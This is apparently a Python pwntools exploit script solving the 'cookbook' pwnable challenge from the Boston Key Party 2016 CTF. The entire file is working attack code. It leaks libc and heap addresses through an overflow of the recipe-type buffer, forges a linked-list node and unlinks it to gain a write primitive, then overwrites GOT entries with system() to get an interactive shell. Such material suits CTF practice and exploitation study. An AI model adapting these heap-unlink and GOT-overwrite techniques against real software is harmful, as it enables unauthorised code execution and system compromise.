# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#
# Based on 
# * http://yum3.tistory.com/48
# * https://gist.github.com/stephenR/cdfa396aa40c22a3180c
#

from pwn import *
import re

#r = process('./cookbook', aslr=False)
r = process('./cookbook')
b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def s(msg):
    r.send(msg + '\n')

if __name__ == "__main__":
    r.recvuntil("what's your name?")
    s('babo')

    #
    # leak LIBC
    #
    s('c')
    s('n') # malloc()
    s('d') # free()
    s('q')
    r.recv()

    s('a')
    s('n') # malloc()
    s('g')
    s('A' * 116 + p32(b.got['puts']))
    s('q')
    
    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    s('q')
    r.recv()

    PUTS_ADDR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
    LIBC_BASE = PUTS_ADDR - libc.symbols['puts']
    log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
    SYSTEM_ADDR = LIBC_BASE + libc.symbols['system']
    log.info('SYSTEM_ADDR: 0x%x' % SYSTEM_ADDR)

    #
    # [2] leak 0x804d0a0
    #
    s('a')
    s('g')
    s('A' * 116 + p32(0x804d0a0))
    s('q')

    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    s('q')
    r.recv()

    CURRENT_RECIPE = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
    log.info('CURRENT_RECIPE: 0x%x' % CURRENT_RECIPE)

    #
    # add nodes to the list 
    #
    #
    # [listhead] [listhead] [name]
    # 0          4          140
    s('c')
    s('a')
    s('water')      # list_add(CURRENT_RECIPE, find_ingredient("water")
    s('1')          # list_add(CURRENT_RECIPE + 4, 1)
    
    s('a')          
    s('corn')       # list_add(CURRENT_RECIPE, find_ingredient("corn")
    s('1')          # list_add(CURRENT_RECIPE + 4, 1)

    s('a')          
    s('tomato')     # list_add(CURRENT_RECIPE, find_ingredient("tomato")
    s('1')          # list_add(CURRENT_RECIPE + 4, 1)
    s('q')
    r.recv()

    raw_input('after adding 3 ingredients...')

    #
    # leak
    #
    s('a')
    s('g')
    s('A'*116 + p32(CURRENT_RECIPE))
    s('q')

    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    s('q')
    r.recv()
    
    SAVED_PTR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
    log.info('SAVED_PTR: 0x%x' % SAVED_PTR)

    #
    # [5] make the fake second node
    #
    # CURRENT_INGREDIENT will be 0x804cff8 after the unlinking 
    # 0x804cff8->next == 0 (PERFECT!!!)
    # 0x804cff8 + 8 == 0x804d000
    # GOT starts at 0x804d00c
    # 
    # memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)*32")
    #
    raw_input('[5] go?')
    s('a')
    s('n') # calloc()
    s('s')
    s(str(0))
    s('p')
    s(str(0x804cff8))
    s('q')
    r.recv()

    #
    # [6] overwrite the first node 
    #
    # 0x804d098->next == 0x804d09c == CURRENT_INGREDIENT
    # so, CURRENT_INGREDIENT will point 0x804cff8 after the unlinking
    #
    raw_input('[6] go?')
    s('c')
    s('d')
    s('q')
    s('g')
    s('9')
    s(p32(SAVED_PTR)+p32(0x804d098) + '\x00')
    r.recv()

    #
    # [7] unlink the second node
    # 
    raw_input('[7] go?')
    
    s('c')
    s('r')
    s('corn\x00')
    s('q')
    r.recv()

    #
    # [8] overwrite 32 GOT entries
    #
    # after the unlinking, CURRENT_INGREDIENT == 0x804cff8
    # 'ag' => 
    #   p = calloc(...)
    #   fgets(p, ,stdin)
    #   memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)...")
    #   free(p)
    #
    raw_input('[8] go?')
    s('a')
    s('g')
    s('sh; ' + p32(0) + p32(SYSTEM_ADDR) * 32) # 32 GOT entries will be overwritten!!!
    r.interactive() # free("sh; \x00") => system("sh; \x00")
